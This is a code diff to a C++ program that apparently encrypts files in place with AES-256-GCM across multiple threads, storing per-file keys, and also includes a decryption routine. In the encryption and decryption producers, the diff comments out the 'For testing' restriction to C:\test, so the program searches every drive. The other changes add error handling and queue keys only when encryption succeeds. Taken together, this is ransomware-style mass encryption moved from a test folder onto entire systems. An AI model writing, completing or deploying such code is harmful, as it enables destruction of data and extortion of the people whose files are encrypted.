@@ -81,8 +81,14 @@ void do_encryption();
 void do_decryption();
 
 int main(int argc, char* argv[]) {
-	do_encryption();
-	do_decryption();
+	try {
+		do_encryption();
+		do_decryption();
+	}
+	catch (...) {
+		cout << GetLastError() << endl;
+	}
+	
 	system("pause");
 	return 0;
 }
@@ -280,8 +286,8 @@ void enc_path_producer_thread(p_producer_bundle& p_bundle) {
 	atomic<int>& flag = p_bundle.flag;
 
 	// For testing
-	drives = new vector<wstring>();
-	drives->push_back(L"C:\\test");
+	//drives = new vector<wstring>();
+	//drives->push_back(L"C:\\test");
 
 	// Try searching for data on all drives
 	for (wstring drive : *drives) {
@@ -359,9 +365,9 @@ void enc_path_consumer_key_producer_thread(enc_p_cons_k_prod_bundle& pk_bundle) 
 			unsigned char * aes_key_and_tag = new unsigned char[32+16]();	// 256 bit key + 128 bit tag
 			
 			aes.get_aes_key(aes_key_and_tag); // Fill first 32 bytes with aes key
-			aes.in_place_encrypt(path_str, aes_key_and_tag + 32); // Fill last 16 bytes with gcm tag
-
-			k_queue.enqueue(k_ptok, make_tuple(path_str, aes_key_and_tag));
+			if (aes.in_place_encrypt(path_str, aes_key_and_tag + 32) > 0) { // Fill last 16 bytes with gcm tag
+				k_queue.enqueue(k_ptok, make_tuple(path_str, aes_key_and_tag));
+			}
 		}
 	} while (items_left || p_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == p_consumer_count);
 	k_doneProducer.fetch_add(1, memory_order_release);	// Notify key_queue we are done producing
@@ -421,8 +427,8 @@ void dec_path_producer_thread(p_producer_bundle& p_bundle) {
 	atomic<int>& flag = p_bundle.flag;
 
 	// For testing
-	drives = new vector<wstring>();
-	drives->push_back(L"C:\\test");
+	//drives = new vector<wstring>();
+	//drives->push_back(L"C:\\test");
 
 	// Try searching for data on all drives
 	for (wstring drive : *drives) {
